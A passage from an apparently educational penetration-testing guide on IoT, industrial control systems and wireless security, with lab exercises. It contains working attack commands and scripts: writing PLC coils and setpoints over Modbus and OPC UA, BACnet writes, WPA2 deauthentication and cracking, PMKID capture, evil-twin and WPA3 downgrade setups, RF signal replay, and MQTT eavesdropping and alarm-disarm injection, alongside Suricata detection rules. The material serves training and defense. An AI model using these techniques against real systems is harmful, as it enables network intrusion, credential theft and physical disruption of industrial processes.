5. **Side-channel susceptibility**: Power analysis (SPA/DPA) and electromagnetic emanation analysis may reveal cryptographic keys. This requires specialized equipment (ChipWhisperer, Riscure Inspector) and is typically reserved for high-value targets.

### 8.3 Firmware Extraction and Analysis Pipeline

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│ Obtain       │────▶│ Extract      │────▶│ Analyze      │────▶│ Emulate      │
│ Firmware     │     │ Filesystem   │     │ Contents     │     │ (optional)   │
└──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘
  Sources:             Tools:              Checks:              Tools:
  - Vendor website     - binwalk           - Hardcoded creds    - QEMU
  - OTA capture        - firmware-mod-kit  - Crypto keys        - Firmadyne
  - UART/JTAG dump     - jefferson (JFFS2) - CVE analysis       - FirmAE
  - SPI flash read     - sasquatch         - Binary protections - FAT
  - Vendor request     - ubi_reader        - Network services
                       - EMBA              - Backdoor accounts
```

```bash
# Automated firmware analysis with EMBA
sudo ./emba -f ./firmware.bin -l ./emba_results -p ./scan-profiles/default-scan.emba

# Key EMBA modules:
# S05 — firmware details and entropy analysis
# S09 — binary protection checks (NX, PIE, RELRO, canary, FORTIFY)
# S12 — binary vulnerability hunting (strings, function calls)
# S20 — shell script analysis
# S25 — kernel module analysis
# S35 — known CVE matching
# S40 — weak credentials hunting
# S45 — known default passwords check
# S55 — SUID binary analysis
# S65 — config file analysis
# S115 — crypto certificate and key analysis

# Firmware emulation with Firmadyne (for Linux-based firmware)
# Requires PostgreSQL, binwalk, QEMU
./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 \
  -np -nk firmware.bin images
./scripts/getArch.sh ./images/1.tar.gz
./scripts/makeImage.sh 1
./scripts/inferNetwork.sh 1
./scratch/1/run.sh

# The emulated firmware runs in QEMU with network connectivity
# enabling dynamic testing of web interfaces and services
```

### 8.4 Network Protocol Analysis

```bash
# Capture IoT network traffic
sudo tcpdump -i eth0 -w iot_traffic.pcap host 192.168.1.100

# Analyze with tshark for MQTT
tshark -r iot_traffic.pcap -Y "mqtt" -T fields \
  -e mqtt.topic -e mqtt.msg

# Analyze CoAP traffic
tshark -r iot_traffic.pcap -Y "coap" -T fields \
  -e coap.code -e coap.opt.uri_path -e data.data

# mDNS/DNS-SD device discovery
avahi-browse -a -t -r
# Reveals service types, hostnames, IP addresses, TXT records

# UPnP device discovery
python3 -c "
import socket
msg = 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
sock.sendto(msg.encode(), ('239.255.255.250', 1900))
while True:
    try:
        data, addr = sock.recvfrom(4096)
        print(f'--- {addr} ---')
        print(data.decode())
    except socket.timeout:
        break
"
```

### 8.5 Cloud and Mobile Backend Testing

Most IoT devices communicate with cloud services. Testing the cloud backend follows web/API security testing methodology (see the API Security Testing document in this series) with IoT-specific considerations:

- **Device provisioning API**: How are new devices registered? Can an attacker register a rogue device?
- **Device-to-cloud authentication**: Is mutual TLS used? Are device certificates unique per device or shared?
- **Command and control channel**: Can an attacker inject commands to arbitrary devices?
- **OTA update mechanism**: Is the firmware signed? Can an attacker push a malicious update?
- **Data pipeline**: Is telemetry data validated on ingestion? Can a compromised device poison analytics?

### 8.6 Radio Signal Analysis with SDR

Software-Defined Radio (SDR) enables analysis of proprietary and standard RF protocols used by IoT devices.

```bash
# RTL-SDR — receive-only, 24-1766 MHz, ~$25
# Identify frequencies used by target devices
rtl_power -f 300M:1000M:1M -g 40 -i 10 -1 scan.csv
# Visualize with heatmap.py
python3 heatmap.py scan.csv scan.png

# HackRF One — transmit and receive, 1 MHz-6 GHz, 20 MHz bandwidth
# Record a signal (e.g., garage door opener at 315 MHz)
hackrf_transfer -r signal_capture.raw -f 315000000 -s 2000000 -g 40

# Replay the captured signal
hackrf_transfer -t signal_capture.raw -f 315000000 -s 2000000 -x 40

# Universal Radio Hacker (URH) — GUI for protocol analysis
urh  # launches GUI for signal analysis, demodulation, protocol decoding

# GNU Radio — signal processing framework
# Create flowgraphs for demodulation, decoding, and analysis

# YARD Stick One — sub-GHz transceiver (300-348, 391-464, 782-928 MHz)
# rfcat for YARD Stick One scripting
rfcat -r
>>> d.setFreq(433920000)
>>> d.setMdmModulation(MOD_ASK_OOK)
>>> d.setMdmDRate(4800)
>>> data = d.RFrecv(timeout=10000)
>>> d.RFxmit(data[0])  # replay
```

### 8.7 Reporting IoT Vulnerabilities

IoT vulnerability reports must address the multi-layered nature of IoT systems. Standard CVSS scoring may underestimate IoT impact because:

- Physical safety consequences (CVSS does not model physical harm)
- Propagation risk across fleet of identical devices
- Difficulty of patching (no auto-update, devices in remote locations)
- Long device lifecycle (10-20 years for industrial/building automation)

Recommended reporting structure:
1. **CVSS v4.0 base score** with Environmental metrics adjusted for IoT context
2. **CWE mapping** — use IoT-specific CWEs (CWE-798: Use of Hard-coded Credentials, CWE-319: Cleartext Transmission, CWE-311: Missing Encryption, CWE-259: Hard-coded Password)
3. **Attack complexity for IoT**: Document required physical access, specialized hardware, proximity requirements
4. **Fleet impact assessment**: Number of affected devices, geographic distribution, update mechanism availability
5. **Safety impact**: If the vulnerability affects safety-critical functions, document the worst-case physical outcome

---

## 9. Industrial IoT and SCADA Security

### 9.1 Purdue Model

The Purdue Enterprise Reference Architecture (Purdue Model) defines network segmentation levels for industrial control systems:

```
┌─────────────────────────────────────────────────────────────────────┐
│ Level 5 — Enterprise Network                                       │
│ Corporate IT: email, ERP, web browsing                             │
├─────────────────────────────────────────────────────────────────────┤
│ Level 4 — Site Business Planning                                   │
│ IT/OT boundary: historians, asset management, MES interfaces       │
│                                                                     │
│                    ══════ DMZ ══════                                 │
│          (firewall, data diode, jump server)                        │
│                                                                     │
├─────────────────────────────────────────────────────────────────────┤
│ Level 3 — Site Operations (Manufacturing Operations)               │
│ SCADA servers, Historian, HMI workstations, engineering stations   │
├─────────────────────────────────────────────────────────────────────┤
│ Level 2 — Area Supervisory Control                                 │
│ HMI, operator stations, alarm systems                              │
├─────────────────────────────────────────────────────────────────────┤
│ Level 1 — Basic Control                                            │
│ PLCs, RTUs, DCS controllers, safety instrumented systems (SIS)     │
├─────────────────────────────────────────────────────────────────────┤
│ Level 0 — Physical Process                                         │
│ Sensors, actuators, valves, motors, physical equipment             │
└─────────────────────────────────────────────────────────────────────┘
```

The critical security boundary is between Levels 3-4 (the IT/OT DMZ). This boundary must enforce strict access control, protocol inspection, and data flow restrictions. A common failure is allowing direct connectivity from Level 5 to Level 1-2, enabling IT compromises to reach safety-critical OT systems.

### 9.2 Industrial Protocols

#### Modbus (TCP port 502, Serial RTU/ASCII)

Modbus was designed in 1979 with zero security features. No authentication, no encryption, no integrity checking.

```bash
# Modbus reconnaissance
nmap -p 502 --script modbus-discover target_plc

# Read holding registers (function code 3)
# Using modbus-cli
modbus read 192.168.1.100 400001 10
# Reads 10 holding registers starting at address 400001

# Write single register (function code 6) — DANGEROUS in production
modbus write 192.168.1.100 400001 0x00FF

# Python Modbus exploitation
python3 << 'MODBUS_SCRIPT'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Read coils (function code 1) — discrete outputs
result = client.read_coils(0, 16)
print(f"Coils: {result.bits}")

# Read holding registers (function code 3) — analog outputs/setpoints
result = client.read_holding_registers(0, 10)
print(f"Registers: {result.registers}")

# Write coil (function code 5) — toggle output
# WARNING: This can affect physical processes
client.write_coil(0, True)

# Write register (function code 6) — modify setpoint
# WARNING: This can affect physical processes
client.write_register(0, 500)

client.close()
MODBUS_SCRIPT
```

#### DNP3 (Distributed Network Protocol 3)

DNP3 is used in electric utility SCADA. It supports authentication (DNP3 Secure Authentication, SA) in newer implementations, but legacy deployments remain unauthenticated.

```bash
# DNP3 Nmap scan
nmap -p 20000 --script dnp3-info target_rtu

# DNP3 supports function codes for:
# Direct Operate (FC 3) — immediate control action
# Select-Before-Operate (FC 3 + FC 4) — two-step control
# Read (FC 1) — data polling
# Write (FC 2) — configuration
# Cold/Warm Restart (FC 13/14) — device reboot
```

#### OPC UA (Open Platform Communications Unified Architecture)

OPC UA is the modern replacement for OPC Classic (DCOM-based). It supports transport-level security (TLS), message-level security (signing and encryption), and user authentication. However, misconfigurations are common:

- **Security Mode: None** — no signing or encryption
- **Anonymous authentication enabled** — no credential required
- **Self-signed certificates accepted** — enables MITM

```bash
# OPC UA enumeration
python3 << 'OPCUA_SCRIPT'
from opcua import Client

client = Client("opc.tcp://192.168.1.100:4840")
client.set_security_string("None,None,None")  # no security
client.connect()

# Browse the address space
root = client.get_root_node()
objects = root.get_children()
for obj in objects:
    print(f"Node: {obj}, Browse Name: {obj.get_browse_name()}")
    for child in obj.get_children():
        print(f"  Child: {child}, Value: {child.get_value() if hasattr(child, 'get_value') else 'N/A'}")

# Read process values
node = client.get_node("ns=2;s=Temperature")
print(f"Temperature: {node.get_value()}")

# Write value (modify setpoint) — EXTREME CAUTION in OT environments
# node.set_value(100.0)

client.disconnect()
OPCUA_SCRIPT
```

#### BACnet (Building Automation and Control Networks)

BACnet is used for HVAC, lighting, fire detection, and elevator control. BACnet/IP uses UDP port 47808.

```bash
# BACnet device discovery
nmap -sU -p 47808 --script bacnet-info target_network/24

# BACnet enumeration with bacnet-stack tools
bacwi -1  # who-is broadcast — discover all BACnet devices
bacrp 100 analog-input 0 present-value  # read property
bacwp 100 analog-output 0 present-value 85 72.5  # write property
```

#### PROFINET

PROFINET is the Siemens industrial Ethernet protocol. It operates at Layer 2 (PROFINET IO) and Layer 3/4 (PROFINET CBA). PROFINET IO uses cyclic real-time communication for process data and acyclic communication for configuration.

```bash
# PROFINET discovery
nmap --script pn-discovery target_network/24

# Siemens S7comm protocol (used by S7-300/400 PLCs)
nmap -p 102 --script s7-info target_plc

# S7comm exploitation with Metasploit
msfconsole
> use auxiliary/scanner/scada/s7_enumerate
> set RHOSTS 192.168.1.100
> run

# plcscan for PLC identification
python3 plcscan.py 192.168.1.100
```

### 9.3 PLC Exploitation

PLC attacks can disrupt physical processes. In a pentest engagement, these attacks must be performed with extreme caution and explicit authorization, ideally against lab replicas rather than production systems.

**Replay attacks**: Capture legitimate control commands and replay them to trigger unintended actions. Because Modbus and many legacy protocols lack sequence numbers or timestamps, replay is trivial.

**Command injection**: Directly write to PLC registers or coils to modify process setpoints, toggle outputs, or halt operations.

**Firmware modification**: Some PLCs allow firmware updates over the network without authentication. A malicious firmware update can persist across reboots and survive factory resets.

**Logic manipulation**: Modify the PLC program logic (ladder logic, function block diagram, structured text) to introduce subtle process deviations. This is the Stuxnet paradigm — the HMI displays normal values while the physical process operates outside safe parameters.

### 9.4 SCADA System Reconnaissance

```bash
# Shodan queries for exposed SCADA systems
# (Use for authorized scope verification only)
# shodan search "port:502 modbus"
# shodan search "port:102 s7comm"
# shodan search "port:47808 bacnet"
# shodan search "port:20000 dnp3"
# shodan search "port:44818 ethernet/ip"

# Passive OT network analysis with Wireshark
# Industrial protocol dissectors built into Wireshark:
# modbus, dnp3, opcua, s7comm, enip, cip, bacnet, profinet

# Display filter examples:
# modbus && modbus.func_code == 6    (write single register)
# s7comm.param.func == 0x05          (S7 write var)
# dnp3.al.func == 0x03               (direct operate)
```

### 9.5 ICS-CERT Advisories

CISA ICS-CERT (now CISA Advisories) publishes security advisories for industrial control systems. Cross-reference discovered devices and firmware versions against:

- **CISA ICS Advisories**: https://www.cisa.gov/news-events/ics-advisories
- **NVD with CPE filter**: Use CPE (Common Platform Enumeration) strings for industrial equipment
- **Vendor-specific security bulletins**: Siemens ProductCERT, Schneider Electric PSIRT, Rockwell Automation, ABB Cybersecurity

### 9.6 Network Segmentation for OT

Proper OT network segmentation follows the Purdue Model with these enforcement mechanisms:

1. **Industrial DMZ**: Separate network zone between IT and OT. Contains data diodes (for unidirectional data flow to IT), jump servers (for authorized OT access), and historians (replicate OT data for IT consumption).

2. **Conduit-based firewalling**: ISA/IEC 62443 defines "conduits" as grouped communication paths between zones. Each conduit has defined allowed protocols, ports, and directions.

3. **Network monitoring**: Purpose-built OT monitoring solutions that understand industrial protocols:
   - **Claroty Platform**: Asset discovery, vulnerability management, threat detection for OT/IoT
   - **Nozomi Networks Guardian**: Passive OT network monitoring, anomaly detection
   - **Dragos Platform**: ICS threat detection, asset inventory, incident response

4. **Micro-segmentation**: Within OT zones, segment by process area, criticality, and safety level. Safety Instrumented Systems (SIS) must be on isolated networks.

### 9.7 Safety vs. Security Considerations

In OT environments, safety and security can conflict:

- **Patching**: Security demands timely patching. Safety demands extensive testing before any change to a safety-certified system. A patch that introduces a bug in a safety function is worse than the vulnerability it fixes.
- **Authentication**: Security demands strong authentication. Safety demands that emergency shutdown procedures are never impeded by authentication failures.
- **Encryption**: Security demands encrypted communication. Safety demands deterministic latency, and encryption introduces computational overhead that may violate real-time constraints.
- **Isolation**: Security demands network isolation. Some safety systems require network communication for coordinated shutdown.

The resolution: **safety always takes precedence over security**, but security measures must be designed to coexist with safety requirements. IEC 62443 provides a framework for balancing both through Security Level (SL) targets that consider the process safety context.

---

## 10. Lab: Wireless and IoT Testing

### 10.1 WiFi Lab Setup

#### Required Hardware

| Component | Purpose | Recommended |
|-----------|---------|-------------|
| WiFi adapter (monitor mode + injection) | Scanning, capture, injection | ALFA AWUS036ACH (dual-band), ALFA AWUS036NHA (2.4 GHz) |
| Access point 1 — WPA2-PSK | Target for PSK attacks | Any consumer AP or hostapd on Raspberry Pi |
| Access point 2 — WPA2-Enterprise | Target for enterprise attacks | FreeRADIUS + hostapd on Raspberry Pi |
| Access point 3 — WPA3-SAE | Target for WPA3 testing | hostapd 2.10+ with SAE support |
| Second WiFi adapter | Evil twin AP | Any AP-capable adapter |
| Client devices | Victims for deauth/evil twin | Smartphones, laptops |

#### WPA2-PSK Lab

```bash
# Configure AP with hostapd
cat > /tmp/lab_wpa2_psk.conf << 'LAB_WPA2'
interface=wlan1
ssid=Lab_WPA2_PSK
channel=6
hw_mode=g
ieee80211n=1

wpa=2
wpa_passphrase=LabPassword123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
LAB_WPA2

sudo hostapd /tmp/lab_wpa2_psk.conf &

# Configure DHCP for lab clients
sudo ip addr add 192.168.10.1/24 dev wlan1
cat > /tmp/lab_dhcp.conf << 'LAB_DHCP'
interface=wlan1
dhcp-range=192.168.10.10,192.168.10.50,255.255.255.0,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
LAB_DHCP
sudo dnsmasq -C /tmp/lab_dhcp.conf &
```

**Exercise 1 — Handshake Capture and Crack:**

```bash
# Terminal 1: Monitor mode on attack adapter
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --bssid <LAB_AP_BSSID> --channel 6 --write lab_capture

# Terminal 2: Deauthenticate a connected client
sudo aireplay-ng --deauth 3 -a <LAB_AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Terminal 3: Crack (after "WPA handshake" captured)
aircrack-ng -w /usr/share/wordlists/rockyou.txt lab_capture-01.cap

# Or with hashcat
hcxpcapngtool -o lab_hash.hc22000 lab_capture-01.cap
hashcat -m 22000 lab_hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

**Exercise 2 — PMKID Attack:**

```bash
sudo hcxdumptool -i wlan0mon -o lab_pmkid.pcapng \
  --filterlist_ap=<LAB_AP_BSSID> --filtermode=2 --enable_status=1
# Wait for PMKID
hcxpcapngtool -o lab_pmkid.hc22000 lab_pmkid.pcapng
hashcat -m 22000 lab_pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

#### WPA2-Enterprise Lab

```bash
# FreeRADIUS configuration for lab
# /etc/freeradius/3.0/users:
# labuser  Cleartext-Password := "LabEnterprise123"

# /etc/freeradius/3.0/clients.conf:
# client lab_ap {
#     ipaddr = 192.168.10.1
#     secret = testing123
# }

# hostapd for WPA2-Enterprise
cat > /tmp/lab_wpa2_eap.conf << 'LAB_EAP'
interface=wlan1
ssid=Lab_WPA2_Enterprise
channel=11
hw_mode=g

wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

ieee8021x=1
own_ip_addr=192.168.10.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
LAB_EAP

sudo freeradius -X &  # debug mode
sudo hostapd /tmp/lab_wpa2_eap.conf &
```

**Exercise 3 — Enterprise Evil Twin:**

```bash
# On the attack machine
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Configure the SSID to match Lab_WPA2_Enterprise
# Connect the lab client device — observe captured MSCHAPv2 challenge/response
# Crack with hashcat -m 5500
```

#### WPA3-SAE Lab

```bash
# WPA3 AP (requires hostapd 2.10+ with SAE support)
cat > /tmp/lab_wpa3.conf << 'LAB_WPA3'
interface=wlan1
ssid=Lab_WPA3
channel=36
hw_mode=a
ieee80211n=1
ieee80211ac=1
ieee80211w=2

wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
sae_password=WPA3LabPassword456
sae_require_mfp=1
sae_pwe=2
sae_anti_clogging_threshold=5
LAB_WPA3

sudo hostapd /tmp/lab_wpa3.conf &
```

**Exercise 4 — WPA3 Transition Mode Downgrade:**

```bash
# Set up transition mode AP
cat > /tmp/lab_wpa3_transition.conf << 'LAB_TRANS'
interface=wlan1
ssid=Lab_WPA3_Transition
channel=6
hw_mode=g
ieee80211w=1

wpa=2
wpa_key_mgmt=WPA-PSK SAE
wpa_passphrase=TransitionPass789
rsn_pairwise=CCMP
sae_password=TransitionPass789
LAB_TRANS

sudo hostapd /tmp/lab_wpa3_transition.conf &

# Create evil twin with WPA2-only to force downgrade
cat > /tmp/lab_downgrade.conf << 'LAB_DOWN'
interface=wlan0
ssid=Lab_WPA3_Transition
channel=6
hw_mode=g

wpa=2
wpa_passphrase=TransitionPass789
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
LAB_DOWN

# Deauthenticate clients from legitimate AP, they reconnect to evil twin via WPA2
```

### 10.2 IoT Lab Setup

#### BLE Lab with ESP32

```bash
# Flash ESP32 with vulnerable BLE application
# Using Arduino IDE or PlatformIO

# Example: BLE smart lock simulator (intentionally vulnerable)
# - No pairing required (Just Works)
# - Hardcoded unlock command
# - No replay protection
# - Cleartext characteristic values

# PlatformIO project structure:
# platformio.ini
# [env:esp32]
# platform = espressif32
# board = esp32dev
# framework = arduino
# lib_deps = ESP32 BLE Arduino

# Scan for the ESP32 BLE device
sudo hcitool lescan
# AA:BB:CC:DD:EE:FF  VulnerableLock

# Enumerate GATT services
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary
> characteristics
> char-read-hnd 0x000e    # Read lock status
> char-write-req 0x0010 01  # Send unlock command

# BLE sniffing with nRF52840
# Flash nRF Sniffer firmware, use with Wireshark
# Observe unencrypted unlock commands
```

#### MQTT Lab with Raspberry Pi

```bash
# Install Mosquitto broker (intentionally misconfigured)
sudo apt install mosquitto mosquitto-clients

# Vulnerable configuration — no authentication, no TLS
cat > /tmp/mosquitto_vuln.conf << 'MQTT_LAB'
listener 1883
allow_anonymous true
# No TLS configured
MQTT_LAB

sudo mosquitto -c /tmp/mosquitto_vuln.conf &

# Simulate IoT device publishing sensor data
mosquitto_pub -h localhost -t "home/sensor/temperature" -m '{"value": 22.5, "unit": "C"}' -r
mosquitto_pub -h localhost -t "home/alarm/status" -m '{"armed": true, "code": "1234"}' -r
mosquitto_pub -h localhost -t "home/camera/stream" -m '{"url": "rtsp://192.168.1.50/live"}' -r

# Attack: Subscribe to all topics
mosquitto_sub -h <BROKER_IP> -t '#' -v

# Attack: Inject malicious commands
mosquitto_pub -h <BROKER_IP> -t "home/alarm/command" -m '{"action": "disarm"}'

# Secure configuration for comparison:
cat > /tmp/mosquitto_secure.conf << 'MQTT_SEC'
listener 8883
cafile /etc/mosquitto/certs/ca.crt
certfile /etc/mosquitto/certs/server.crt
keyfile /etc/mosquitto/certs/server.key
require_certificate true
allow_anonymous false
password_file /etc/mosquitto/passwd
acl_file /etc/mosquitto/acl
MQTT_SEC
```

### 10.3 Firmware Analysis Exercise

```bash
# Download a vulnerable firmware image (intentionally vulnerable for training)
# Examples: DVRF (Damn Vulnerable Router Firmware), IoTGoat

# Exercise 5 — Firmware Extraction and Analysis:

# Step 1: Entropy analysis
binwalk -E firmware.bin
# High entropy = encryption or compression
# Low entropy with recognizable patterns = uncompressed filesystem

# Step 2: Extract
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# Step 3: Find credentials
grep -r "admin\|root\|password\|passwd" etc/
cat etc/shadow
# Look for default/hardcoded credentials

# Step 4: Identify vulnerable binaries
find . -name "*.cgi" -o -name "httpd" -o -name "lighttpd" | while read f; do
    echo "=== $f ==="
    file "$f"
    checksec --file="$f"  # check NX, PIE, canary, RELRO
done

# Step 5: Search for known CVEs
# Identify library versions
strings squashfs-root/lib/libc.so.0 | grep -i "version\|musl\|uclibc\|glibc"
strings squashfs-root/usr/lib/libssl.so* | grep "OpenSSL"

# Step 6: EMBA automated analysis
sudo ./emba -f firmware.bin -l /tmp/emba_lab_results
```

### 10.4 SDR Exercise

```bash
# Exercise 6 — Capture and Analyze RF Signals

# Step 1: Frequency scanning with RTL-SDR
rtl_power -f 300M:500M:100k -g 40 -i 5 -1 scan_300_500.csv

# Step 2: Identify a target frequency (e.g., 433.92 MHz — common IoT frequency)
# Record the signal
rtl_sdr -f 433920000 -s 2048000 -g 40 capture_433.raw

# Step 3: Analyze with URH (Universal Radio Hacker)
urh
# Load capture_433.raw
# Auto-detect modulation (ASK/OOK, FSK, PSK)
# Demodulate and identify protocol structure
# Extract binary data / device commands

# Step 4: With HackRF — replay attack
hackrf_transfer -r capture_433.raw -f 433920000 -s 2000000 -g 40 -l 32
# Press the target remote during capture
# Replay:
hackrf_transfer -t capture_433.raw -f 433920000 -s 2000000 -x 40

# Step 5: Analyze rolling code (if present)
# Rolling code systems (KeeLoq, etc.) prevent simple replay
# Requires capturing multiple codes and analyzing the PRNG
# or exploiting implementation weaknesses
```

### 10.5 Monitoring and Detection Lab

```bash
# Exercise 7 — Set Up Wireless IDS

# Deploy Kismet as WIDS
sudo kismet -c wlan0mon --override log_types=kismet,pcapng

# Kismet alerts to monitor:
# APSPOOF — Evil twin detection
# DEAUTHFLOOD — Deauthentication attack detection
# BCASTDISCON — Broadcast disconnection frame flood
# PROBERESP — Directed probe responses (KARMA indicator)

# Deploy Suricata with MQTT/industrial protocol rules
cat >> /etc/suricata/suricata.yaml << 'SURICATA_IOT'
# IoT protocol detection
app-layer:
  protocols:
    mqtt:
      enabled: yes
    modbus:
      enabled: yes
      detection-ports:
        dp: 502
    dnp3:
      enabled: yes
      detection-ports:
        dp: 20000
SURICATA_IOT

# Custom Suricata rules for IoT
cat > /etc/suricata/rules/iot.rules << 'IOT_RULES'
# Detect MQTT subscription to wildcard topics
alert mqtt any any -> any any (msg:"MQTT wildcard subscription detected"; \
  mqtt.subscribe.topic; content:"#"; sid:1000001; rev:1;)

# Detect Modbus write coil (function code 5)
alert modbus any any -> any 502 (msg:"Modbus write single coil"; \
  modbus_func:5; sid:1000002; rev:1;)

# Detect Modbus write register (function code 6)
alert modbus any any -> any 502 (msg:"Modbus write single register"; \
  modbus_func:6; sid:1000003; rev:1;)

# Detect unauthenticated MQTT connection
alert mqtt any any -> any 1883 (msg:"MQTT connection without TLS"; \
  flow:to_server; sid:1000004; rev:1;)
IOT_RULES

sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Monitor Suricata alerts
tail -f /var/log/suricata/fast.log
```

### 10.6 Summary of Lab Exercises

| Exercise | Focus Area | Tools | Expected Outcome |
|----------|-----------|-------|-----------------|
| 1 | WPA2-PSK handshake capture + crack | airmon-ng, airodump-ng, aireplay-ng, hashcat | Recovered PSK passphrase |
| 2 | PMKID attack | hcxdumptool, hcxpcapngtool, hashcat | PSK recovery without client deauth |
| 3 | WPA2-Enterprise evil twin | hostapd-wpe, hashcat | Captured enterprise credentials |
| 4 | WPA3 transition mode downgrade | hostapd, aireplay-ng | Forced WPA2 fallback |
| 5 | Firmware extraction and analysis | binwalk, EMBA, checksec | Extracted credentials, identified CVEs |
| 6 | SDR signal capture and replay | RTL-SDR, HackRF, URH | Captured and replayed RF commands |
| 7 | Wireless/IoT IDS deployment | Kismet, Suricata | Detection of wireless and IoT attacks |

---

## References

- IEEE 802.11-2020: Wireless LAN Medium Access Control (MAC) and Physical Layer (PHY) Specifications
- IEEE 802.1X-2020: Port-Based Network Access Control
- RFC 7664: Dragonfly Key Exchange (SAE)
- RFC 8110: Opportunistic Wireless Encryption (OWE)
- RFC 2865/2866: RADIUS Authentication/Accounting
- RFC 6614: RadSec — Transport Layer Security for RADIUS
- RFC 7252: CoAP — Constrained Application Protocol
- OWASP IoT Top 10 (2024): https://owasp.org/www-project-internet-of-things/
- IEC 62443: Industrial Automation and Control Systems Security
- NIST SP 800-82 Rev. 3: Guide to OT Security
- Vanhoef, M. & Ronen, E. (2019): Dragonblood — Analyzing the Dragonfly Handshake of WPA3
- Vanhoef, M. & Piessens, F. (2017): Key Reinstallation Attacks (KRACK)
- Vanhoef, M. (2021): Fragment and Forge — Breaking Wi-Fi Through Frame Aggregation and Fragmentation (FragAttacks)
- Fluhrer, S., Mantin, I., Shamir, A. (2001): Weaknesses in the Key Scheduling Algorithm of RC4
- Antille, J. et al. (2019): KNOB — Key Negotiation of Bluetooth
- Wi-Fi Alliance WPA3 Specification v3.3 (2024)
- Zigbee Alliance: Zigbee 3.0 Specification
- Z-Wave Alliance: Z-Wave Plus v2 Specification
- LoRa Alliance: LoRaWAN 1.0.4 / 1.1 Specification
